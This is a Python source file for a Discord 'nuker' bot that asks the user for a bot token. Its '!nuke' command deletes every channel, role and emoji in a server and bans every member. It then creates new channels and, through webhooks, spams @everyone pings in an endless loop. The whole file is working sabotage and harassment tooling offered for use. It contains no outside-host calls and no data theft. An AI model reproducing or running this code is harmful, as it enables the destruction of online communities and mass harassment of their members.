
from typing import ContextManager
import discord
import colorama
from colorama import Fore as F, Style as S
colorama.init()
from discord.ext import commands
import json
import os
colorama.init()

r = F.BLUE
w = F.RESET
g = F.GREEN
t = F.LIGHTBLACK_EX
a = F.WHITE
c = F.RED
b = F.LIGHTGREEN_EX

os.system('title Push enter.')
input("ILY Remake [ Beta Made by the oh h1 ]")
os.system('cls')
def ascii():
    print(f'''
                                      {a}┌┼┐ {r} ╦═╗  ╦  ╔═╗
                                      {g}└┼┐ {t} ╠╦╝  ║  ╠═╝
                                      {b}└┼┘ {a} ╩╚═  ╩  ╩  
''')
ascii()
os.system('title Login')
tokeninput = f'{b}[ $ ]{a} Bot token :  '
TOKEN = input(tokeninput)



os.system('cls')

def main():
    ()
    headers = {
        "authorization" : TOKEN
    }
	
os.system('cls')	
os.system('title XYV NUKER')
ascii()
antinet = commands.Bot(command_prefix='!', intents = discord.Intents.all())

@antinet.event
async def on_ready():
    await antinet.change_presence(status=discord.Status.idle, activity=discord.Game('Beta X'))
    print(f'''
   {t}$            {b}!nuke{t}   To Start
   
    
     {c} IGNORE THIS LOG JUST KEEP THIS OPEN ''')


antinet.remove_command('help')

@antinet.command()
async def w(ctx, *, message):
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $w ')
    print(f'               {F.RESET}[{g}+{F.RESET}] Watching Text: {message}')
    print(' ')
    await ctx.message.delete()
    await antinet.change_presence(
	
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
			
        ))


@antinet.command(aliases=['nuke1'])
async def nk(ctx):
  await ctx.message.delete()
  print(f'{b}[ ! ]{F.RESET} Command Used: !nuke')
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f'{b}[ + ] {F.RESET}Channel Deleted')
    except Exception as e:
      print(f'{c}[ - ] {F.RESET}Channel NOT Deleted')

  for member in ctx.guild.members:
    try:
      await member.ban(reason='BECAUSE YOUR FAT')
      print(f'{b}[ + ]{F.RESET} Member Banned')
    except Exception as e:
      print(f'{c}[ - ]{F.RESET} Member NOT Banned')

  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f'{b}[ + ]{F.RESET} Role Deleted')
    except Exception as e:
      print(f'{c}[ - ]{F.RESET} Role NOT Deleted')

  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(f'{b}[ + ]{F.RESET} Emoji Deleted')
    except:
      print(f'{c}[ - ]{F.RESET} Emoji NOT Deleted')
	  
  for i in range(10):
    await ctx.guild.create_text_channel("test")
    print(f'{b}[ + ]{F.RESET} Created Channel')

@antinet.event
async def on_guild_channel_create(channel):
  web = await channel.create_webhook(name="xyv")
  while True:
    await web.send('@everyone @here ')
    await channel.send('@everyone @here v2 soon? ')

antinet.run(TOKEN)

Anti